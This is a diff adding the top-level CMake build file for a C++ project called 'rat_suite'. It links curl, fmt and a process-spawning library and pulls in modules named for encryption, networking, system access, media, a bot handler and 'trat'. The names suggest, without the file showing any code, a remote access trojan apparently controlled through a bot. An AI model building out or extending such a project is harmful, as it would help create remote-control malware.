@@ -1,0 +1,57 @@
+cmake_minimum_required(VERSION 3.25)
+project(rat_suite LANGUAGES CXX)
+
+set(CMAKE_CXX_STANDARD 20)
+set(CMAKE_CXX_STANDARD_REQUIRED ON)
+set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
+
+set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
+set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
+# === Options ===
+option(STATIC "Build static libraries" ON)
+option(DEBUG "Enable debug logging" OFF)
+
+# === Dependencies ===
+
+# fmt
+find_package(fmt REQUIRED)
+
+# curl
+find_package(CURL REQUIRED)
+
+# spdlog
+if(DEBUG)
+    find_package(spdlog REQUIRED)
+    message(STATUS "Debug mode enabled: adding -fsanitize=address -g -O0")
+
+    # Add flags for all targets
+    add_compile_options(-fsanitize=address -g -O0)
+    add_link_options(-fsanitize=address)
+
+endif()
+
+# === Tiny Process dependency ===
+if(NOT DEFINED TINY_PROCESS_PATH)
+    message(FATAL_ERROR "TINY_PROCESS_PATH must be defined (path to tiny-process-library install dir).")
+endif()
+
+set(TINY_PROCESS_HEADER "${TINY_PROCESS_PATH}/include" CACHE PATH "Tiny Process include dir")
+set(TINY_PROCESS_LIBRARY_ARCHIVE "${TINY_PROCESS_PATH}/lib/libtiny-process-library.a" CACHE FILEPATH "Tiny Process static library")
+
+# Create an imported target for easier usage in submodules
+add_library(tiny-process STATIC IMPORTED GLOBAL)
+set_target_properties(tiny-process PROPERTIES
+    IMPORTED_LOCATION "${TINY_PROCESS_LIBRARY_ARCHIVE}"
+    INTERFACE_INCLUDE_DIRECTORIES "${TINY_PROCESS_HEADER}"
+)
+
+
+# === Submodules ===
+add_subdirectory(rat_encryption)
+add_subdirectory(rat_networking)
+add_subdirectory(rat_system)
+add_subdirectory(rat_tbot)
+add_subdirectory(rat_media)
+add_subdirectory(rat_tbot_handler)
+add_subdirectory(rat_trat)
+
